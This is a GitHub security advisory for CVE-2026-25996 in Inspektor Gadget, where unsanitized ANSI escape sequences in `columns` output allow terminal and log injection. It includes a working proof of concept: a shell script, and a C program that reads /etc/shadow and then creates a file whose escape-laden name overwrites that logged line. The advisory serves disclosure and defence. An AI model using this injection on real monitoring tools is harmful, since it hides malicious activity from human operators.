# [M] Inspektor Gadget uses unsanitized ANSI Escape Sequences In `columns` Output Mode

## Summary
Severity: Medium
Advisory: GHSA-34r5-6j7w-235f
CVE: CVE-2026-25996
CWE: CWE-150
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-04-22
Source: https://github.com/advisories/GHSA-34r5-6j7w-235f
Type: github-advisory

## Affected
- Go: `github.com/inspektor-gadget/inspektor-gadget` — affected >=0 <0.49.1

## Details
### Description
String fields from eBPF events in `columns` output mode are rendered to the terminal without any sanitization of control characters or ANSI escape sequences. 

Therefore, a maliciously forged – partially or completely – event payload, coming from an observed container, might inject the escape sequences into the terminal of `ig` operators, with various effects.

The `columns` output mode is the default when running `ig run` interactively.

### PoC

#### Attachments
run.sh
```bash

#!/bin/bash
set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CONTAINER_NAME="poc-escape-inject"

echo "Make sure ig is running in another terminal:"
echo "  sudo ig run trace_open -c ${CONTAINER_NAME}"
echo ""
echo "Press Enter to continue..."
read -r

sudo docker run --rm \
    --name "${CONTAINER_NAME}" \
    -v "${SCRIPT_DIR}/escape_inject.c:/src/escape_inject.c:ro" \
    gcc:latest \
    bash -c "
        gcc -o /tmp/escape_inject /src/escape_inject.c && \
        /tmp/escape_inject
    "
```

escape_inject.c
```c
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>

static void read_file(const char *path)
{
	int fd = open(path, O_RDONLY);
	if (fd >= 0)
		close(fd);
}

static void create_file(const char *path)
{
	int fd = open(path, O_CREAT | O_WRONLY | O_TRUNC, 0644);
	if (fd >= 0)
		close(fd);
}

int main(void)
{
	printf("[1] normal activity\n");
	create_file("/tmp/app.log");
	printf("[2] malicious read of /etc/shadow\n");
	read_file("/etc/shadow");
	usleep(300000);
	printf("[3] tampering the log\n");
	create_file("/etc\x1b[1A/bashrc\x1b[1B\x1b[13C");
	usleep(300000);
	return 0;
}
```

1. Setup a Linux host and build/install `ig` version `0.48.0`
2. Run the attached `run.sh` on a terminal
3. Run `sudo ig run trace_open -c poc-escape-inject` on another terminal
4. Press "Enter" on the terminal attached to `run.sh`
5. Observe the events traced by `ig`
6. Notice that, at some point, the line where `/etc/shadow` is logged is overwritten `/etc/bashrc`, demonstrating the log injection


### Impact

The impact depends on the injection point – mostly due to length limitations – and on the terminal used by the operator when running displaying `columns` output.

At the very least, the injection can be used for [Log Injection](https://owasp.org/www-community/attacks/Log_Injection), by inserting new lines or deleting existing ones.

However, by leveraging Operating System Command (OSC) ANSI escape sequences, the impact on modern terminal can vary, possibly allowing an attacker to:

- lead to DoS (Denial of Service)
- write to the system clipboard
- create hyperlinks to attacker-controlled servers
- change window title
- potentially execute code (see referenced resources)

### Resources
- https://www.youtube.com/watch?v=spb8Gk9Z09Y

### Notes

The `json` output mode was already sanitizing the content.

## References
- https://github.com/inspektor-gadget/inspektor-gadget/security/advisories/GHSA-34r5-6j7w-235f
- https://nvd.nist.gov/vuln/detail/CVE-2026-25996
- https://github.com/inspektor-gadget/inspektor-gadget/commit/d59cf72971f9b7110d9c179dc8ae8b7a11dbd6d2
- https://github.com/inspektor-gadget/inspektor-gadget
- https://github.com/inspektor-gadget/inspektor-gadget/releases/tag/v0.49.1
